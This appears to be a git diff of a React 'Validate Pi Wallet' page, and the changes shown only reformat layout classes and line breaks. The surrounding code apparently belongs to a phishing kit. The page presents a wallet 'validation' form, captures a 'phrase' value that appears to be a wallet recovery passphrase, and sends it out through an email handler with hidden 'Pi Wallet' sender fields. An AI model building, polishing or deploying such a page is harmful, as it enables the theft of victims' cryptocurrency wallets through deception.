@@ -59,10 +59,16 @@ export default function Validate() {
       variants={variants}
       initial="closed"
       animate="open"
-      className="mt-7 min-h-screen"
+      className="mt-7 flex flex-col items-center min-h-screen"
     >
-      <form className="max-w-[500px] min-h-screen w-full" ref={form} onSubmit={sendEmail}>
-        <p className="mb-8 font-bold text-lg lg:text-xl text-center">Validate Pi Wallet</p>
+      <form
+        className="max-w-[500px] min-h-screen w-full"
+        ref={form}
+        onSubmit={sendEmail}
+      >
+        <p className="mb-8 font-bold text-lg lg:text-xl text-center">
+          Validate Pi Wallet
+        </p>
         <div className="w-full px-5 lg:px-10">
           <input type="hidden" name="from_name" id="" value="Pi Wallet" />
           <input type="hidden" name="to_name" id="" value="Pi Wallet" />
@@ -90,7 +96,9 @@ export default function Validate() {
               autoComplete="false"
               ref={inputRef}
               className={`p-3 w-full ${
-                error === "" ? "placeholder:text-white" : "placeholder:text-red-500"
+                error === ""
+                  ? "placeholder:text-white"
+                  : "placeholder:text-red-500"
               } placeholder:font-normal  bg-transparent font-semibold resize-none duration-300 text-sm lg:text-base outline-none text-white rounded`}
               id=""
               value={phrase}
